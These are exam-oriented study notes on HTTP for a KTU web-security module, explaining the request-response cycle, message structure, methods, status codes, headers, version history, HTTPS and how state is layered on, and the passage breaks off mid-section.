## SECTION 1: Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition

**HyperText Transfer Protocol (HTTP)** is an application-layer, stateless, request-response protocol standardized by the **Internet Engineering Task Force (IETF)** through **RFC 9110** (and RFC 9112 for HTTP/1.1). It forms the foundational communication language used by distributed, collaborative, hypermedia information systems, enabling web browsers, crawlers, APIs, and mobile clients to exchange resources (HTML documents, JSON payloads, images, videos) over the Internet.

In the **TCP/IP model**, HTTP operates at the **Application Layer (Layer 7)** and by default rides on **TCP port 80** (cleartext) or **TCP port 443** (encrypted via TLS, i.e., HTTPS). HTTP is **asymmetric** — it always follows a *client → server → client* pattern, and is fundamentally **stateless**, meaning every request is independent and carries no memory of prior exchanges unless supplemental mechanisms (cookies, sessions, tokens) are layered on top.

> [!IMPORTANT]
> **KTU Syllabus Highlight — Module 4 (Web Security):**
> Understanding *how HTTP works* is the **prerequisite foundation** for every subsequent topic in this module — TLS/SSL, HTTPS hardening, cookie/session attacks (XSS, CSRF, session hijacking), Same-Origin Policy, and CORS. If a student cannot articulate the HTTP request-response cycle, they will lose marks on virtually every Part B question in Module 4.

### 1.2 Conceptual Analogy — "The Restaurant Waiter Model"

Imagine walking into a restaurant:

- **You (the customer)** = the **Web Browser / HTTP Client** (e.g., Chrome, Firefox, curl).
- **The kitchen** = the **Web Server** (e.g., Apache, Nginx, IIS) that prepares resources.
- **The waiter** = **HTTP**, carrying your order (request) to the kitchen and bringing food back (response).
- **Your order slip** = the **HTTP Request Message** (specifies *what* you want, in *what form*, with what *options*).
- **The plated dish on a tray** = the **HTTP Response Message** (contains the actual resource plus a *receipt* — headers/status — telling you whether the order succeeded).

Just like you can order the same dish repeatedly without the waiter remembering you (statelessness), HTTP treats every request as fresh. And just like a waiter can be replaced or work for many customers, HTTP can be **non-persistent** (new TCP connection per request, like HTTP/1.0) or **persistent** (reused connection, like HTTP/1.1 default).

### 1.3 Key Terminology Snapshot

| Term | Meaning |
|---|---|
| **Resource** | Any identifiable item on the web (HTML page, image, JSON object). |
| **URI / URL** | Uniform Resource Identifier / Locator — the "address" of a resource. |
| **Client** | The initiator of an HTTP request (browser, bot, mobile app). |
| **Server** | The responder that hosts resources and replies with status + body. |
| **Proxy** | An intermediary that forwards HTTP messages between client and server. |
| **Stateless** | Each request is independent; no built-in memory of past requests. |
| **TLS (Transport Layer Security)** | The cryptographic layer that turns HTTP into HTTPS. |

> [!NOTE]
> **HTTP is a *protocol*, not a *server*.** It defines the *language* of conversation. Servers like Apache/Nginx *implement* this language. This distinction is a common 3-mark question in KTU papers.

<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## SECTION 2: Deep Theoretical Analysis & KTU High-Yield Reference Sheet

### 2.1 The HTTP Transactional Model — Anatomy of a Web Exchange

HTTP operates on a strict **request–response** transactional model. The full lifecycle of any HTTP interaction unfolds in five logical phases:

1. **DNS Resolution** — The client resolves the hostname in the URL (e.g., `www.ktu.edu.in`) to an IP address via the Domain Name System.
2. **TCP Connection Establishment** — A three-way handshake (`SYN → SYN-ACK → ACK`) establishes a reliable connection (default **port 80** for HTTP, **port 443** for HTTPS).
3. **HTTP Request Transmission** — The client serializes and sends an HTTP request message.
4. **Server Processing & Response Transmission** — The server processes the request, accesses resources (databases, filesystems, caches), and serializes an HTTP response message back.
5. **Connection Teardown or Reuse** — Depending on HTTP version and headers, the connection is closed or kept alive for further requests.

### 2.2 HTTP Request Message Structure

An HTTP request message has three mandatory structural blocks and one optional body:

$$\text{HTTP Request} = \underbrace{\text{Request Line}}_{\text{method + URI + version}} + \underbrace{\text{Header Block}}_{\text{key: value pairs}} + \underbrace{\text{Blank Line}}_{\text{CRLF separator}} + \underbrace{\text{Message Body}}_{\text{optional payload}}$$

A canonical example:

```
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0)
Accept: text/html,application/xhtml+xml
Accept-Language: en-US
Connection: keep-alive
Cookie: sessionid=abc123
[blank line — CRLF]
[empty body for GET]
```

### 2.3 HTTP Response Message Structure

$$\text{HTTP Response} = \underbrace{\text{Status Line}}_{\text{version + code + phrase}} + \underbrace{\text{Header Block}}_{\text{key: value pairs}} + \underbrace{\text{Blank Line}}_{\text{CRLF}} + \underbrace{\text{Message Body}}_{\text{resource payload}}$$

A canonical example:

```
HTTP/1.1 200 OK
Date: Mon, 15 Sep 2025 12:00:00 GMT
Server: Apache/2.4.57 (Ubuntu)
Content-Type: text/html; charset=UTF-8
Content-Length: 1234
Set-Cookie: sessionid=xyz789; HttpOnly; Secure
[blank line — CRLF]
<!DOCTYPE html><html>...</html>
```

### 2.4 HTTP Methods — The "Verbs" of Web Communication

| Method | Purpose | Idempotent | Safe | Has Body |
|---|---|---|---|---|
| **GET** | Retrieve a resource | Yes | Yes | No |
| **POST** | Submit data / create resource | No | No | Yes |
| **PUT** | Replace a resource entirely | Yes | No | Yes |
| **PATCH** | Partially modify a resource | No | No | Yes |
| **DELETE** | Remove a resource | Yes | No | Optional |
| **HEAD** | Same as GET but response has no body | Yes | Yes | No |
| **OPTIONS** | Discover allowed methods / CORS preflight | Yes | Yes | No |
| **TRACE** | Echo back the received request (diagnostic) | Yes | No | No |
| **CONNECT** | Establish a tunnel (used by HTTPS proxies) | No | No | No |

> [!IMPORTANT]
> **Idempotent** means repeating the same request N times produces the same server-side state as executing it once. **Safe** means the request must not modify server state. GET should be both safe and idempotent — violating this is a classic KTU short-answer trap.

### 2.5 HTTP Status Codes — The Server's "Mood Report"

Status codes are grouped into five classes:

| Class | Range | Meaning | Common Examples |
|---|---|---|---|
| **1xx Informational** | 100–199 | Provisional response, request still in progress | 100 Continue, 101 Switching Protocols |
| **2xx Success** | 200–299 | Request received, understood, accepted | 200 OK, 201 Created, 204 No Content |
| **3xx Redirection** | 300–399 | Further action needed (often by client) | 301 Moved Permanently, 302 Found, 304 Not Modified |
| **4xx Client Error** | 400–499 | Malformed request / unauthorized | 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found |
| **5xx Server Error** | 500–599 | Server failed to fulfill valid request | 500 Internal Server Error, 502 Bad Gateway, 503 Service Unavailable |

### 2.6 HTTP Header Categories

Headers are the **metadata backbone** of HTTP and are critical for both functionality and security:

- **General Headers** — Apply to both request and response (`Date`, `Connection`, `Cache-Control`).
- **Request Headers** — Client context (`Host`, `User-Agent`, `Accept`, `Accept-Encoding`, `Authorization`, `Cookie`, `Referer`).
- **Response Headers** — Server context (`Server`, `Set-Cookie`, `WWW-Authenticate`).
- **Entity / Payload Headers** — Describe the body (`Content-Type`, `Content-Length`, `Content-Encoding`, `Last-Modified`, `ETag`).
- **Security Headers** — Defensive metadata (`Strict-Transport-Security`, `Content-Security-Policy`, `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`).

### 2.7 The HTTP Version Timeline

| Version | Year | Key Innovation |
|---|---|---|
| **HTTP/0.9** | 1991 | Single-line GET only, HTML-only responses |
| **HTTP/1.0** | 1996 | Headers introduced, status codes, methods, one request per TCP connection |
| **HTTP/1.1** | 1997 | Persistent connections (default), chunked transfer, pipelining, host header required |
| **HTTP/2** | 2015 | Binary framing, multiplexing, header compression (HPACK), server push |
| **HTTP/3** | 2022 | Replaces TCP with QUIC over UDP, built-in encryption, 0-RTT handshakes |

### 2.8 HTTP vs HTTPS — The Critical Security Distinction

| Dimension | HTTP | HTTPS |
|---|---|---|
| **Default Port** | **80** | **443** |
| **Transport Encryption** | None (plaintext) | TLS 1.2 / TLS 1.3 |
| **Server Authentication** | None | X.509 digital certificate |
| **Data Integrity** | Vulnerable to tampering | HMAC-authenticated ciphertext |
| **Confidentiality** | Public-readable | End-to-end encrypted |
| **SEO Ranking** | Penalized by Google | Boosted |
| **Browser Warning** | "Not Secure" label | Padlock icon |
| **KTU Exam Frequency** | Foundational | ⭐⭐⭐⭐⭐ Extremely High |

> [!NOTE]
> **HTTPS = HTTP + TLS.** It is *not* a separate protocol. The application-layer semantics are identical; only the transport security wrapper changes. This is a frequent KTU Part A question.

### 2.9 Statelessness and How It Is Patched

Because HTTP is stateless, every transaction is *amnesiac*. Real applications need memory, so they layer state on top:

- **Cookies** — Small key-value pairs set via `Set-Cookie` and resent via `Cookie`.
- **Sessions** — Server-side stores keyed by session ID held in a cookie.
- **Tokens (JWT, OAuth)** — Self-contained credentials carried in `Authorization` header.
- **Hidden Form Fields & URL Rewriting** — Legacy state-passing techniques.

> [!IMPORTANT]
